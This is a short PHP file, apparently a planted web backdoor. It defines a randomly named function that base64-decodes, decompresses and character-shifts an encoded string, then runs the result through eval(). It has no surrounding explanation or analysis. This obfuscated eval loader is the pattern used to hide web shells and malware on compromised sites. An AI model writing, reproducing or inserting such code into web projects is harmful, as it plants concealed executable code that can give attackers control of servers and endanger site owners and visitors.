<?php function LLIkj($ptetfy)
{ 
$ptetfy=gzinflate(base64_decode($ptetfy));
 for($i=0;$i<strlen($ptetfy);$i++)
 {
$ptetfy[$i] = chr(ord($ptetfy[$i])-1);
 }
 return $ptetfy;
 }eval(LLIkj("U1QEAce08qRcTdWEwICQ0JiUOC0HewA="));?>